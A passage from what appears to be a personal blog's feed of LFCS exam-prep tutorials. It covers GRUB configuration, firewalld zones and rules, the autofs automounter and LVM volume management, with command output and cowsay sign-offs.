</span><span class='line'>GRUB_CMDLINE_LINUX="crashkernel=auto rd.lvm.lv=rhel/root rd.lvm.lv=rhel/swap rhgb quiet"
</span><span class='line'>GRUB_DISABLE_RECOVERY="true"</span></code></pre></td></tr></table></div></figure>


<p>After editing those, you can run <code>grub2-mkconfig > /boot/grub2/grub.cfg</code> to create the new boot config file.</p>

<p>If you need to reinstall the bootloader, you can do so with <code>grub2-install</code></p>

<h3>Learn more</h3>

<p><a href="https://fedoraproject.org/wiki/SysVinit_to_Systemd_Cheatsheet">SysVinit to Systemd Cheatsheet</a></p>

<p><a href="https://lists.freedesktop.org/archives/systemd-devel/2016-February/035709.html">emergency mode vs rescue mode</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ You will always get the greatest        \
</span><span class='line'>\ recognition for the job you least like. /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Using firewalld]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/02/lfcs-prep-using-firewalld/"/>
    <updated>2018-02-02T14:23:40-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/02/lfcs-prep-using-firewalld</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at firewall configuration on CentOS / RedHat by using firewalld, the replacement for iptables. Since they are both mutually exclusive, if you decide to use firewalld, ensure that iptables is not running and cannot be started, by masking the service with <code>systemctl mask iptables</code></p>

<!-- more -->


<p>With firewalld, traffic is classified into zones that can have their own rules and ports / services. The default zone is called the <em>public</em> zone</p>

<p>Now let&rsquo;s see a couple of commands for accomplishing various tasks.</p>

<ul>
<li>list the predefined zones</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-zones
</span><span class='line'>work drop internal external trusted home dmz public block</span></code></pre></td></tr></table></div></figure>


<ul>
<li>print the default zone</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-default-zone
</span><span class='line'>public</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list active zones and their interfaces</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-active-zones
</span><span class='line'>public
</span><span class='line'>  interfaces: enp0s3</span></code></pre></td></tr></table></div></figure>


<ul>
<li>set new default zone</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --set-default-zone=NAME</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list predefined services</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-services 
</span><span class='line'>RH-Satellite-6 amanda-client amanda-k5-client bacula bacula-client ceph ceph-mon dhcp dhcpv6 dhcpv6-client dns docker-registry dropbox-lansync freeipa-ldap freeipa-ldaps freeipa-replication ftp high-availability http https imap imaps ipp ipp-client ipsec iscsi-target kadmin kerberos kpasswd ldap ldaps libvirt libvirt-tls mdns mosh mountd ms-wbt mysql nfs ntp openvpn pmcd pmproxy pmwebapi pmwebapis pop3 pop3s postgresql privoxy proxy-dhcp ptp pulseaudio puppetmaster radius rpc-bind rsyncd samba samba-client sane smtp smtps snmp snmptrap squid ssh synergy syslog syslog-tls telnet tftp tftp-client tinc tor-socks transmission-client vdsm vnc-server wbem-https xmpp-bosh xmpp-client xmpp-local xmpp-server</span></code></pre></td></tr></table></div></figure>


<ul>
<li>print information about the settings of the public zone</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --list-all --zone=public
</span><span class='line'>public (active)
</span><span class='line'>  target: default
</span><span class='line'>  icmp-block-inversion: no
</span><span class='line'>  interfaces: enp0s3
</span><span class='line'>  sources: 
</span><span class='line'>  services: dhcpv6-client ftp mountd nfs rpc-bind ssh
</span><span class='line'>  ports: 
</span><span class='line'>  protocols: 
</span><span class='line'>  masquerade: no
</span><span class='line'>  forward-ports: 
</span><span class='line'>  sourceports: 
</span><span class='line'>  icmp-blocks: 
</span><span class='line'>  rich rules: </span></code></pre></td></tr></table></div></figure>


<ul>
<li>add a service</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --add-service samba</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>to make changes persist through reboots, add the <strong>&mdash;permanent</strong> flag, and don&rsquo;t forget to reload after</p></li>
<li><p>add multiple services</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --zone=NAME --add-service={serv1,serv2,serv3}</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add port</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd add-port=8080/tcp</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add source to a zone</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --permanent --zone=NAME--add-source=RANGE</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add masquerade for a zone</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --zone=NAME --add-masquerade</span></code></pre></td></tr></table></div></figure>


<ul>
<li>port forwarding (must enable masquerade first). Forward packets destined to port 22 to port 8888</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --zone=NAME --add-forward-port=port=22:proto=tcp:toport=8888</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Your best consolation is the hope that \
</span><span class='line'>| the things you failed to get weren't   |
</span><span class='line'>\ really worth having.                   /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - autofs automounter]]></title>
    <link href="http://chousensha.github.io/blog/2018/01/30/lfcs-prep-autofs-automounter/"/>
    <updated>2018-01-30T12:57:31-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/01/30/lfcs-prep-autofs-automounter</id>
    <content type="html"><![CDATA[<p>In a <a href="http://chousensha.github.io/blog/2017/09/10/nfs-shares-on-centos-7/">previous post</a> we looked at sharing folders with NFS. Now we take a step further to look at a client-only configuration that allows on demand mounting / unmounting of various filesystems. There is no need for /etc/fstab entries and resources are preserved better. The automounter is provided by the <em>autofs</em> package. After installing it, check that the autofs service has been started, before proceeding with the configuration.</p>

<!-- more -->


<p>The main configuration is done in the master map file, located at <code>/etc/auto.master</code>. Its format is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;mount-point&gt; &lt;map-type&gt; &lt;options&gt;</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p><strong>mount-point</strong> = base location for the autofs filesystem to be mounted.  For indirect maps this directory will be created  (as  with  mkdir -p) and is removed when the autofs filesystem is umounted.</p></li>
<li><p><strong>map-type</strong> = map type used for this mount point. A map file can be given here</p></li>
<li><p><strong>options</strong> = mount options</p></li>
</ul>


<p>Here are the contents of my <em>/etc/auto.master</em> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/mnt    /etc/auto.share</span></code></pre></td></tr></table></div></figure>


<p>The map file can have any name of your choosing. The auto.share file has the following format:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;mount point&gt; &lt;options&gt; &lt;location&gt;</span></code></pre></td></tr></table></div></figure>


<p>I made one with these values:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nfs-share -fstype=nfs 192.168.241.130:/var/nfs-share</span></code></pre></td></tr></table></div></figure>


<p>The name refers to the autofs mount point. I didn&rsquo;t specify an absolute path, so the share will be mounted under the directory specified in the master map (/mnt in this case). I had a quick share served by an NFS server, and after all the above configuration, I restarted autofs and looked under /mnt:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /mnt/share
</span><span class='line'>docs</span></code></pre></td></tr></table></div></figure>


<p>Done! No need for manually adding entries to /etc/fstab and mounting them.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Change your thoughts and you change \
</span><span class='line'>\ your world.                         /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - LVM storage management]]></title>
    <link href="http://chousensha.github.io/blog/2018/01/27/lfcs-prep-lvm-storage-management/"/>
    <updated>2018-01-27T09:56:20-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/01/27/lfcs-prep-lvm-storage-management</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at logical volume management tasks. LVM improves the traditional partition to disk approach, adding flexibility (extending and reducing space), snapshot capabilities and redundancy.</p>

<!-- more -->


<p>First, some terminology is in order:</p>

<ul>
<li><p>physical volumes (PV) are the physical devices that are mapped to be used inside LVM. Their storace unit is called a physical extent (PE)</p></li>
<li><p>volume groups (VG) are storage pools made from PVs</p></li>
<li><p>logical volumes (LV) are made up of the VG space</p></li>
</ul>


<h2>Creating PVs</h2>

<p>I am now going to create 2 PVs of 100 MB each. You first need to create 2 LVM partitions. If you look inside fdisk, you see the partition code for LVM is <strong>8e</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>8e  Linux LVM</span></code></pre></td></tr></table></div></figure>


<p>So before writing the partition in fdisk, use <code>t</code> to change it to Linux LVM. Then verify that the new partitions were created:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lsblk | grep sdb
</span><span class='line'>sdb             8:16   0    1G  0 disk 
</span><span class='line'>sdb1          8:17   0  100M  0 part 
</span><span class='line'>sdb2          8:18   0  100M  0 part </span></code></pre></td></tr></table></div></figure>


<p>Now the PVs can be created:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pvcreate /dev/sdb1 /dev/sdb2
</span><span class='line'>  Physical volume "/dev/sdb1" successfully created.
</span><span class='line'>  Physical volume "/dev/sdb2" successfully created.</span></code></pre></td></tr></table></div></figure>


<h2>Creating VGs</h2>

<p>Now you can create a VG from the 2 PVs:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgcreate vg-zero /dev/sdb1 /dev/sdb2
</span><span class='line'>  Volume group "vg-zero" successfully created</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s look at our existing PVs now:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pvs
</span><span class='line'>  PV         VG      Fmt  Attr PSize  PFree 
</span><span class='line'>  /dev/sda2  rhel    lvm2 a--  29.00g  4.00m
</span><span class='line'>  /dev/sdb1  vg-zero lvm2 a--  96.00m 96.00m
</span><span class='line'>  /dev/sdb2  vg-zero lvm2 a--  96.00m 96.00m</span></code></pre></td></tr></table></div></figure>


<p>And check an individual PV in more detail:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pvdisplay /dev/sdb1
</span><span class='line'>  --- Physical volume ---
</span><span class='line'>  PV Name               /dev/sdb1
</span><span class='line'>  VG Name               vg-zero
</span><span class='line'>  PV Size               100.00 MiB / not usable 4.00 MiB
</span><span class='line'>  Allocatable           yes 
</span><span class='line'>  PE Size               4.00 MiB
</span><span class='line'>  Total PE              24
</span><span class='line'>  Free PE               24
</span><span class='line'>  Allocated PE          0
</span><span class='line'>  PV UUID               ViTFfu-jBZE-47Ie-d6qB-WTDt-fpNf-bPC00Y</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s check our VGs:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgs
</span><span class='line'>  VG      #PV #LV #SN Attr   VSize   VFree  
</span><span class='line'>  rhel      1   2   0 wz--n-  29.00g   4.00m
</span><span class='line'>  vg-zero   2   0   0 wz--n- 192.00m 192.00m</span></code></pre></td></tr></table></div></figure>


<p>And in more detail:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgdisplay vg-zero 
</span><span class='line'>  --- Volume group ---
</span><span class='line'>  VG Name               vg-zero
</span><span class='line'>  System ID             
</span><span class='line'>  Format                lvm2
</span><span class='line'>  Metadata Areas        2
</span><span class='line'>  Metadata Sequence No  1
</span><span class='line'>  VG Access             read/write
</span><span class='line'>  VG Status             resizable
</span><span class='line'>  MAX LV                0
</span><span class='line'>  Cur LV                0
</span><span class='line'>  Open LV               0
</span><span class='line'>  Max PV                0
</span><span class='line'>  Cur PV                2
</span><span class='line'>  Act PV                2
</span><span class='line'>  VG Size               192.00 MiB
</span><span class='line'>  PE Size               4.00 MiB
</span><span class='line'>  Total PE              48
</span><span class='line'>  Alloc PE / Size       0 / 0   
</span><span class='line'>  Free  PE / Size       48 / 192.00 MiB
</span><span class='line'>  VG UUID               gUf1XI-znJt-MM2T-V721-PNbe-uxcr-m3bVTe</span></code></pre></td></tr></table></div></figure>


<h2>Creating LVs</h2>

<p>Next, I created a LV named inventory with a size of 128 MB, from the vg-zero VG:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lvcreate -n inventory -L 128MB vg-zero 
</span><span class='line'>  Logical volume "inventory" created.</span></code></pre></td></tr></table></div></figure>


<p>Look at the existing LVs:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lvs
</span><span class='line'>  LV        VG      Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
</span><span class='line'>  root      rhel    -wi-ao----  26.99g                                                    
</span><span class='line'>  swap      rhel    -wi-ao----   2.00g                                                    
</span><span class='line'>  inventory vg-zero -wi-a----- 128.00m     </span></code></pre></td></tr></table></div></figure>


<p>And check our newly created one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lvdisplay /dev/vg-zero/inventory 
</span><span class='line'>  --- Logical volume ---
</span><span class='line'>  LV Path                /dev/vg-zero/inventory
</span><span class='line'>  LV Name                inventory
</span><span class='line'>  VG Name                vg-zero
</span><span class='line'>  LV UUID                jE4XRJ-ddlX-nM8s-NVSr-4cfK-F9O0-JcKecs
</span><span class='line'>  LV Write Access        read/write
</span><span class='line'>  LV Creation host, time rhel7, 2018-01-26 15:36:04 +0200
</span><span class='line'>  LV Status              available
</span><span class='line'>  # open                 0
</span><span class='line'>  LV Size                128.00 MiB
</span><span class='line'>  Current LE             32
</span><span class='line'>  Segments               2
</span><span class='line'>  Allocation             inherit
</span><span class='line'>  Read ahead sectors     auto
</span><span class='line'>  - currently set to     8192
</span><span class='line'>  Block device           253:2</span></code></pre></td></tr></table></div></figure>


<p>Before using the new LV, you need to create a filesystem on top of it. I went with XFS:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkfs.xfs /dev/vg-zero/inventory 
</span><span class='line'>meta-data=/dev/vg-zero/inventory isize=512    agcount=4, agsize=8192 blks
</span><span class='line'>         =                       sectsz=512   attr=2, projid32bit=1
</span><span class='line'>         =                       crc=1        finobt=0, sparse=0
</span><span class='line'>data     =                       bsize=4096   blocks=32768, imaxpct=25
</span><span class='line'>         =                       sunit=0      swidth=0 blks
</span><span class='line'>naming   =version 2              bsize=4096   ascii-ci=0 ftype=1
</span><span class='line'>log      =internal log           bsize=4096   blocks=855, version=2
</span><span class='line'>         =                       sectsz=512   sunit=0 blks, lazy-count=1
</span><span class='line'>realtime =none                   extsz=4096   blocks=0, rtextents=0</span></code></pre></td></tr></table></div></figure>


<p>Now prepare a location to mount it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /mnt/inventory</span></code></pre></td></tr></table></div></figure>


<p>I want it to mount at boot, so I added the following to <code>/etc/fstab</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/dev/vg-zero/inventory     /mnt/inventory                xfs    defaults        0 0</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s break down the <strong>/etc/fstab</strong> fields a bit:</p>

<ul>
<li><p>the first field represents the device, which can be specified by name, UUID, or label</p></li>
<li><p>the second field is the mount point of the device</p></li>
<li><p>the third is the filesystem type</p></li>
<li><p>fourth is for the mount options. The <em>defaults</em> option specifies the usage of default options: rw, suid, dev, exec, auto, nouser, async</p></li>
<li><p>the fifth is a backup flag for the dump utility. Use 1 to enable it and 0 to disable it</p></li>
<li><p>sixth represents the fsck automatic check at boot. Use 0 to disable it, 1 for the root filesystem, and 2 for other filesystems that might need the automatic checking</p></li>
</ul>


<p>It&rsquo;s a good practice to mount the devices you added to fstab before a reboot to ensure there are no errors: <code>mount -a</code></p>

<h2>Extending / reducing VGs</h2>

<p>To add more space to a VG, you can add more PVs to it. Let&rsquo;s see its current space:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgdisplay vg-zero | grep Free
</span><span class='line'>  Free  PE / Size       16 / 64.00 MiB</span></code></pre></td></tr></table></div></figure>


<p>I created a new PV on /dev/sdb3 and added it to the VG:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgextend vg-zero /dev/sdb3
</span><span class='line'>  Volume group "vg-zero" successfully extended</span></code></pre></td></tr></table></div></figure>


<p>The storage size has increased now:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgdisplay vg-zero | grep Free
</span><span class='line'>  Free  PE / Size       28 / 112.00 MiB</span></code></pre></td></tr></table></div></figure>


<p>And to reduce the space of a VG, remove one or more PVs from it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgreduce vg-zero /dev/sdb3
</span><span class='line'>  Removed "/dev/sdb3" from volume group "vg-zero"</span></code></pre></td></tr></table></div></figure>


<p>To migrate the PEs used on a PV to other PVs in the VG, use <strong>pvmove</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pvmove /dev/sdb1
</span><span class='line'>  /dev/sdb1: Moved: 0.00%
</span><span class='line'>  /dev/sdb1: Moved: 100.00%</span></code></pre></td></tr></table></div></figure>


<h2>Resizing LVs</h2>

<p>You can use <em>lvresize</em> for extending or shrinking LVs, or <em>lvextend</em> for extending only. There needs to be enough free space in the VG for growing the LV.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lvextend -L +50M /dev/vg-zero/inventory 
</span><span class='line'>  Rounding size to boundary between physical extents: 52.00 MiB.
</span><span class='line'>  Size of logical volume vg-zero/inventory changed from 128.00 MiB (32 extents) to 180.00 MiB (45 extents).
</span><span class='line'>  Logical volume vg-zero/inventory successfully resized.</span></code></pre></td></tr></table></div></figure>


<p>You also need to grow the filesystem to occupy the newly extended LV. Since I picked XFS, I&rsquo;ll use <em>xfs_growfs</em> for this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xfs_growfs /mnt/inventory/
</span><span class='line'>meta-data=/dev/mapper/vg--zero-inventory isize=512    agcount=4, agsize=8192 blks
</span><span class='line'>         =                       sectsz=512   attr=2, projid32bit=1
</span><span class='line'>         =                       crc=1        finobt=0 spinodes=0
</span><span class='line'>data     =                       bsize=4096   blocks=32768, imaxpct=25
</span><span class='line'>         =                       sunit=0      swidth=0 blks
</span><span class='line'>naming   =version 2              bsize=4096   ascii-ci=0 ftype=1
</span><span class='line'>log      =internal               bsize=4096   blocks=855, version=2
</span><span class='line'>         =                       sectsz=512   sunit=0 blks, lazy-count=1
</span><span class='line'>realtime =none                   extsz=4096   blocks=0, rtextents=0
</span><span class='line'>data blocks changed from 32768 to 46080</span></code></pre></td></tr></table></div></figure>


<p>This was just for demo, in practice you want to resize both the LV and the filesystem with a single command:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lvextend -L 190M -r /dev/vg-zero/inventory 
</span><span class='line'>  Rounding size to boundary between physical extents: 192.00 MiB.
</span><span class='line'>  Size of logical volume vg-zero/inventory changed from 180.00 MiB (45 extents) to 192.00 MiB (48 extents).
</span><span class='line'>  Logical volume vg-zero/inventory successfully resized.
</span><span class='line'>meta-data=/dev/mapper/vg--zero-inventory isize=512    agcount=6, agsize=8192 blks
</span><span class='line'>         =                       sectsz=512   attr=2, projid32bit=1
</span><span class='line'>         =                       crc=1        finobt=0 spinodes=0
</span><span class='line'>data     =                       bsize=4096   blocks=46080, imaxpct=25
</span><span class='line'>         =                       sunit=0      swidth=0 blks
</span><span class='line'>naming   =version 2              bsize=4096   ascii-ci=0 ftype=1
</span><span class='line'>log      =internal               bsize=4096   blocks=855, version=2
</span><span class='line'>         =                       sectsz=512   sunit=0 blks, lazy-count=1
</span><span class='line'>realtime =none                   extsz=4096   blocks=0, rtextents=0
</span><span class='line'>data blocks changed from 46080 to 49152</span></code></pre></td></tr></table></div></figure>


<p>This time I specified an absolute size instead of adding a certain amount.</p>

<h2>Removing LVs</h2>

<p>When you&rsquo;re done, you backed up your data or no longer need it, you can delete the LV. Unmount it first:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>umount -v /mnt/inventory/
